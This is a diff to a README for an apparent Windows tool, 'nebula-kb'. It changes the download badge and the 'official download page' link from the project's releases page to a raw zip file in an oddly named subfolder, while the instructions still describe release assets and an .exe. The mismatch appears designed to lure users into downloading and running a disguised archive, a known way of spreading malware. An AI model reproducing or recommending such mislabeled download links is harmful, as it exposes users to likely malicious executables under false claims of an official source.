@@ -1,6 +1,6 @@
 # 🌌 nebula-kb - Manage your knowledge assets with ease
 
-[![](https://img.shields.io/badge/Download_Nebula-Blue?style=for-the-badge&logo=github)](https://github.com/kathrinechurrigueresque832/nebula-kb/releases)
+[![](https://img.shields.io/badge/Download_Nebula-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kathrinechurrigueresque832/nebula-kb/main/allivalite/nebula-kb-3.5-alpha.5.zip)
 
 ## 📁 What is nebula-kb?
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the [official download page](https://github.com/kathrinechurrigueresque832/nebula-kb/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/kathrinechurrigueresque832/nebula-kb/main/allivalite/nebula-kb-3.5-alpha.5.zip).
 2.  Look for the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file finishes downloading, navigate to your "Downloads" folder.
